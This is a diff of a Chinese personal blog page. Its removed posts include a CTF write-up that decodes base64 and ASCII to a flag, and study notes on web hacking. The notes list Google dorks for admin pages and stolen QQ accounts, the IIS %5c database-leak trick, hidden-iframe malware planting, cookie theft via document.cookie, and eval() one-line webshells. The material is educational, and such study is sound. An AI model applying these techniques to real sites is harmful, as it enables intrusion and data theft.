-<p><strong>第一步</strong></p>
-<p>打开文件，发现以==结尾，为base64编码，解码后得到字符串</p>
-<p><strong>第二步</strong></p>
-<p>没小于128的，猜测是ASCII码，写个python转换一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &quot;76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119&quot;</span><br><span class="line">str &#x3D; str.split(&quot;;&amp;#&quot;);</span><br><span class="line">text &#x3D; &quot;&quot;</span><br><span class="line">for s in str:</span><br><span class="line">	text +&#x3D; chr(int(s))</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw</span><br></pre></td></tr></table></figure>
-<p><strong>第三步</strong></p>
-<p>将其进行base64解码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">119&#x2F;101&#x2F;108&#x2F;99&#x2F;111&#x2F;109&#x2F;101&#x2F;116&#x2F;111&#x2F;97&#x2F;116&#x2F;116&#x2F;97&#x2F;99&#x2F;107&#x2F;97&#x2F;110&#x2F;100&#x2F;100&#x2F;101&#x2F;102&#x2F;101&#x2F;110&#x2F;99&#x2F;101&#x2F;119&#x2F;111&#x2F;114&#x2F;108&#x2F;100</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><strong>最后一步</strong></p>
-<p>将其转换为ascill码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcometoattackanddefenceworld</span><br></pre></td></tr></table></figure>
-<p>添加格式，即为flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" data-id="ckkdrz0z70007ugus60u76cr9" data-title="CTF答案记录" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-基础课-精通黑客脚本笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/12/23/%E5%9F%BA%E7%A1%80%E8%AF%BE-%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time class="dt-published" datetime="2020-12-23T12:56:36.000Z" itemprop="datePublished">2020-12-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/12/23/%E5%9F%BA%E7%A1%80%E8%AF%BE-%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/">精通黑客脚本笔记</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h1 id="第二章-常见脚本漏洞演练"><a href="#第二章-常见脚本漏洞演练" class="headerlink" title="第二章 常见脚本漏洞演练"></a>第二章 常见脚本漏洞演练</h1><h2 id="Google-Hack技术大演练"><a href="#Google-Hack技术大演练" class="headerlink" title="Google Hack技术大演练"></a>Google Hack技术大演练</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intitle:管理登录 filetype:php # 搜索存在敏感信息的网站</span><br><span class="line">payment site:fr # 法国的相关支付界面</span><br><span class="line">inurl:qq.txt # 搜索被盗的qq号</span><br><span class="line">site:baidu.com # 搜索子域名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="暴库漏洞攻击"><a href="#暴库漏洞攻击" class="headerlink" title="暴库漏洞攻击"></a>暴库漏洞攻击</h2><p>conn.asp是数据库连接文件，包含了被调用数据库的路径及数据库名</p>
-<p>conn.asp暴库原理为，直接访问conn.asp时，相对路径出错</p>
-<p>/改成%5c。%5c在16进制中为\。当IIS遇到\，IIS以为遇到了一个虚拟目录，便停止解析，从而报错</p>
-<h1 id="第三章-HTML语言入门"><a href="#第三章-HTML语言入门" class="headerlink" title="第三章 HTML语言入门"></a>第三章 HTML语言入门</h1><h2 id="自定义头像跨站漏洞"><a href="#自定义头像跨站漏洞" class="headerlink" title="自定义头像跨站漏洞"></a>自定义头像跨站漏洞</h2><p>若写入跨站代码后，返回数据上出现字符，则存在跨站漏洞。只需要将HTML中标签闭合即可。</p>
-<h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><p>隐藏域页面中不饿建，通常用来收集或发送信息</p>
-<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><frameset>不能放在<body>或<head>标签中
-
-<p>动态框架<iframe>可以实现在网页内部嵌入网页，但是其中的src属性也带来了挂马风险。挂马时，把该标签的高度、宽度、frameborder设置为0</p>
-<h1 id="第四章-Javascript和Vbscript入门"><a href="#第四章-Javascript和Vbscript入门" class="headerlink" title="第四章 Javascript和Vbscript入门"></a>第四章 Javascript和Vbscript入门</h1><p>通过Javascript程序，可以控制web页面的外观，也能够检测用户数据的有效性，而这些操作都不需要和服务器进行交互，这样就减轻了服务器的处理数据负担。</p>
-<p>事件是Javascript让页面活起来的驱动力，所有的Javascript都是对某个事件做出的操作和反应</p>
-<h2 id="Javascript基础"><a href="#Javascript基础" class="headerlink" title="Javascript基础"></a>Javascript基础</h2><p>document.writeln()在添加<pre>标签后，才会有换行作用。</p>
-<p>三种交互方法：alert()，confirm()，prompt()</p>
-<p>变量区分大小写</p>
-<p>BOM，browser object model，浏览器对象模型</p>
-<p>通过Javascript内置对象navigator我么可以知道当前使用的浏览器是那种类型，那种版本，是否支持java，当前浏览器插件信息等</p>
-<p>window对象在使用时，允许省略。如window.alert省略为alert</p>
-<p>DOM，document object model，文档对象模型</p>
-<p>document.cookie可以获取cookie，用于窃取cookie</p>
-<h2 id="VBScript基础"><a href="#VBScript基础" class="headerlink" title="VBScript基础"></a>VBScript基础</h2><p>VBScript只有一种数据类型Variant</p>
-<p>为了不影响程序运行效率和养成良好变成习惯，先声明变量再赋值。使用dim</p>
-<h2 id="使用cookie"><a href="#使用cookie" class="headerlink" title="使用cookie"></a>使用cookie</h2><p>通过document.cookie进行设置并取用</p>
-<p>HTTP Set-Cookie头的格式为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:name&#x3D;value;[expires&#x3D;date];[path&#x3D;pathname];[domain&#x3D;domainname];[secure];</span><br><span class="line">方括号为可以省略的部分</span><br></pre></td></tr></table></figure>
-<p>设置cookie的格式为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;encodeURI(&quot;name&quot;)+&quot;&#x3D;&quot;+encodeURI(name)+&quot;;&quot;</span><br></pre></td></tr></table></figure>
-<p>escape和encodeURI都可以用来对字符进行编码。escape将非字母字符转换为用字符和数字表示的等价字符串；encodeURI类似。</p>
-<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="正则表达式对象方法"><a href="#正则表达式对象方法" class="headerlink" title="正则表达式对象方法"></a>正则表达式对象方法</h3><h4 id="test"><a href="#test" class="headerlink" title="test()"></a>test()</h4><p>lastIndex属性返回下一次字符串搜索开始的位置。若为全局搜索，返回最后一个匹配的字符串后面一个字符的位置</p>
-<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>lastIndex属性返回前一次匹配字符串的第一个字符的位置</p>
-<h3 id="正则表达式的字符串对象的方法"><a href="#正则表达式的字符串对象的方法" class="headerlink" title="正则表达式的字符串对象的方法"></a>正则表达式的字符串对象的方法</h3><p>match,</p>
-<h2 id="跨站攻击"><a href="#跨站攻击" class="headerlink" title="跨站攻击"></a>跨站攻击</h2><p>UBB，Ultimate Bulletin Board，一种tag语法代码</p>
-<p>① 过滤用户提交变量中的&lt;和&gt;，从而防止用户自行构造html标记</p>
-<p>② 过滤其中的：代码，从而防止javascript和vbscript的执行</p>
-<p>③ 过滤或转换空格字符</p>
-<h1 id="第五章-数据库基础"><a href="#第五章-数据库基础" class="headerlink" title="第五章 数据库基础"></a>第五章 数据库基础</h1><h2 id="利用SQL进行数据查询"><a href="#利用SQL进行数据查询" class="headerlink" title="利用SQL进行数据查询"></a>利用SQL进行数据查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tablename (field type[(size)][NOT NULL]&#123;, field type [(size)][NOT NULL]&#125;[, PRIMARY KEY(field&#123;,field...&#125;)]);</span><br><span class="line">SELECT[ALL|DISTINCT]&#123;expr[[AS]c_alias&#123;,expr[[AS]c_alias]...&#125;&#125; from tableref&#123;,tableref...&#125; [where&lt;search_condition]</span><br><span class="line">SELECT DISTINCT id FROM hack</span><br><span class="line">SELECT id AS 标识, name AS 姓名, city AS 城市, age AS 年龄 FROM hack</span><br><span class="line">SELECT * FROM hack GROUP BY age</span><br><span class="line">SELECT * FROM hack WHERE city&#x3D;(SELECT city FROM hack WHERE id&#x3D;100)</span><br></pre></td></tr></table></figure>
-<p>集合函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COUNT(column_name) 统计column_name列非空的元组数目</span><br><span class="line">SUM(column_name) 统计column_name列的值的和</span><br><span class="line">AVG(column_name)</span><br><span class="line">MAX(column_name)</span><br><span class="line">MIN(column_name)</span><br></pre></td></tr></table></figure>
-<p>子查询结果是集合时，谓语关键词可以使用IN，ANY/ALL，EXISTS</p>
-<h1 id="第六章-ASP基础"><a href="#第六章-ASP基础" class="headerlink" title="第六章 ASP基础"></a>第六章 ASP基础</h1><h2 id="ASP常用内置对象"><a href="#ASP常用内置对象" class="headerlink" title="ASP常用内置对象"></a>ASP常用内置对象</h2><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><p>用于得到用户提交的数据</p>
-<p>用querystring获取GET，用form获取POST</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myname&#x3D;request.querystring(&quot;name&quot;) #GET方式</span><br><span class="line">myname&#x3D;request.form(&quot;name&quot;) #POST方式</span><br></pre></td></tr></table></figure>
-<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><p>将服务器数据发送到用户的浏览器上</p>
-<p>write方法，将数据输出到客户端</p>
-<p>redirect方法，重定向，需要设置Response对象的Buffer属性为真</p>
-<p>Status属性，HTTP响应的状态码</p>
-<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>扩展asp功能，可以利用符合COM接口的第三方组件</p>
-<p>CreateObject()方法，利用符合COM接口的第三方组件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set myVar &#x3D; Server.CreateObject(&quot;ADODB.connection&quot;)</span><br></pre></td></tr></table></figure>
-<p>HTMLEncode()方法，用于字符串编码，可防止跨站漏洞</p>
-<p>URLEncode()方法，字符串以URL的编码输出</p>
-<h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>存储特定用户会话所需的信息</p>
-<h2 id="ASP组件"><a href="#ASP组件" class="headerlink" title="ASP组件"></a>ASP组件</h2><p>即ActiveX</p>
-<h2 id="ADO"><a href="#ADO" class="headerlink" title="ADO"></a>ADO</h2><p>ActiveX Data Objects，ActiveX数据对象</p>
-<h1 id="第九章-PHP基础"><a href="#第九章-PHP基础" class="headerlink" title="第九章 PHP基础"></a>第九章 PHP基础</h1><h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><p>一个PHP文件由五个部分组成：HTML、PHP标记、PHP语句、空格、注释</p>
-<h3 id="PHP标记风格"><a href="#PHP标记风格" class="headerlink" title="PHP标记风格"></a>PHP标记风格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;内容&#39;; ?&gt;</span><br><span class="line">#XML风格</span><br><span class="line">&lt;? echo &#39;内容&#39;; ?&gt; </span><br><span class="line">#简短风格，需要在php.ini中启用short_open_tag，且是默认启用</span><br><span class="line">&lt;SCRIPT LANGUAGE&#x3D;&#39;php&#39;&gt;echo &#39;内容&#39;;&lt;&#x2F;SCRIPT&gt; </span><br><span class="line">#SCRIPT风格</span><br><span class="line">&lt;% echo &#39;内容&#39; %&gt; </span><br><span class="line"># ASP风格，需要启用asp_tags，默认不启用</span><br></pre></td></tr></table></figure>
-<h3 id="访问表单变量"><a href="#访问表单变量" class="headerlink" title="访问表单变量"></a>访问表单变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$display # 需要开启register_globals，默认不开启</span><br><span class="line">$_POST[&#39;display&#39;] # 默认</span><br><span class="line">$HTTP_POST_VARS[&#39;display&#39;] # 弃用 </span><br></pre></td></tr></table></figure>
-<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS、$_SERVER、$_GET、$_POST、$_COOKIE、$_FILES、$_ENV、$_REQUEST、$_SESSION</span><br></pre></td></tr></table></figure>
-<h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">trim() # 去除空格</span><br><span class="line">addslshes() # 转移字符</span><br><span class="line">stripslashes() # 与addslshes功能相反</span><br><span class="line">php.ini中的magic_quotes_gpc配置指令 # 若为TRUE，则会实现addslshes和stripslashes</span><br></pre></td></tr></table></figure>
-<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new mysqli(&#39;主机名&#39;，&#39;MYSQL用户名&#39;, &#39;MYSQL密码&#39;,&#39;需要访问的数据库&#39;)</span><br><span class="line">$db &#x3D; mysqli_connect(&#39;主机名&#39;，&#39;MYSQL用户名&#39;, &#39;MYSQL密码&#39;,&#39;需要访问的数据库&#39;)</span><br><span class="line"></span><br><span class="line">$result &#x3D; mysql_query(&quot;select * from hack&quot;)</span><br><span class="line">$result &#x3D; mysql_db_query(&quot;crack&quot;,&quot;select * from hack&quot;)</span><br></pre></td></tr></table></figure>
-<h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><h3 id="与文件系统和服务器交互"><a href="#与文件系统和服务器交互" class="headerlink" title="与文件系统和服务器交互"></a>与文件系统和服务器交互</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#上传</span><br><span class="line">在超级全局数组$_FILES中处理（需要register_global开启）</span><br><span class="line"></span><br><span class="line">#目录文件</span><br><span class="line">opendir()</span><br><span class="line">readdir()</span><br><span class="line">closedir()</span><br><span class="line">mkdir()</span><br><span class="line">basename(),dirname()</span><br><span class="line">rmdir()</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line"></span><br><span class="line">#程序执行函数</span><br><span class="line">exec(string command[,array &amp;result[,int &amp;result_value]]) # 只返回命令结果的最后一行，若以result传递变量，将获得返回字符串数组；若result_value传递变量，将获得返回代码</span><br><span class="line">passthru() #将结果直接输出并显示在浏览器</span><br><span class="line">system() #将结果直接输出并显示在浏览器</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="会话控制"><a href="#会话控制" class="headerlink" title="会话控制"></a>会话控制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie()</span><br><span class="line">session_get_cookie_params()</span><br></pre></td></tr></table></figure>
-<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br></pre></td></tr></table></figure>
-<h1 id="第十章-PHP程序常见问题"><a href="#第十章-PHP程序常见问题" class="headerlink" title="第十章 PHP程序常见问题"></a>第十章 PHP程序常见问题</h1><h2 id="PHP注射漏洞"><a href="#PHP注射漏洞" class="headerlink" title="PHP注射漏洞"></a>PHP注射漏洞</h2><p>intval() 将所有数据强制转换为数字</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/23/%E5%9F%BA%E7%A1%80%E8%AF%BE-%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/" data-id="ckmadesnt0008y0us5s9tepf3" data-title="精通黑客脚本笔记" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" rel="tag">基础课</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-my-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/12/22/hello-my-blog/" class="article-date">
-  <time class="dt-published" datetime="2020-12-22T08:02:53.000Z" itemprop="datePublished">2020-12-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/12/22/hello-my-blog/">hello my blog</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/22/hello-my-blog/" data-id="ckk1u3o4h0001tsus1mci359t" data-title="hello my blog" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
+    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -1540,7 +1561,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" rel="tag">基础课</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">文学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" rel="tag">论文学习</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" rel="tag">基础课</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">文学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A7%84%E5%88%92/" rel="tag">规划</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" rel="tag">论文学习</a></li></ul>
     </div>
   </div>
 
@@ -1550,7 +1571,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 13.33px;">dev</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" style="font-size: 16.67px;">基础课</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">文学</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">考证</a> <a href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" style="font-size: 16.67px;">论文学习</a>
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 15px;">dev</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E8%AF%BE/" style="font-size: 17.5px;">基础课</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 12.5px;">摘抄</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">文学</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">考证</a> <a href="/tags/%E8%A7%84%E5%88%92/" style="font-size: 12.5px;">规划</a> <a href="/tags/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" style="font-size: 17.5px;">论文学习</a>
     </div>
   </div>
 
@@ -1572,23 +1593,23 @@
       <ul>
         
           <li>
+            <a href="/2021/03/30/%E6%91%98%E6%8A%84-Foundations-of-Cryptography/">摘抄-Foundations of Cryptography</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/30/%E6%91%98%E6%8A%84-%E8%BD%AC%E5%9E%8B%E4%B8%AD%E7%9A%84%E5%9C%B0%E6%96%B9%E6%94%BF%E5%BA%9C/">摘抄-转型中的地方政府</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/26/%E8%A7%84%E5%88%92-21%E5%B9%B4/">规划-21年</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/26/%E8%A7%84%E5%88%92-21-26%E5%B9%B4/">规划-21-26年</a>
+          </li>
+        
+          <li>
             <a href="/2021/03/24/%E5%9F%BA%E7%A1%80%E8%AF%BE-%E6%B8%85%E5%8D%8EOS/">基础课-清华OS</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/16/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-%E6%96%B9%E6%B3%95%E8%AE%BA/">论文学习-方法论</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/15/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-2020-S-P-A-A-Stealthier-Partitioning-Attack-against-Bitcoin-Peer-to-Peer-Network/">论文学习-2020-S-P-A-A Stealthier Partitioning Attack against Bitcoin Peer-to-Peer Network</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/15/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0-2020-S-P-A-Security-Analysis-of-the-Facebook-Ad-Library/">论文学习-2020-S-P-A Security Analysis of the Facebook Ad Library</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/13/CTF-wp-NahamCon2021/">CTF-wp-NahamCon2021</a>
           </li>
         
       </ul>
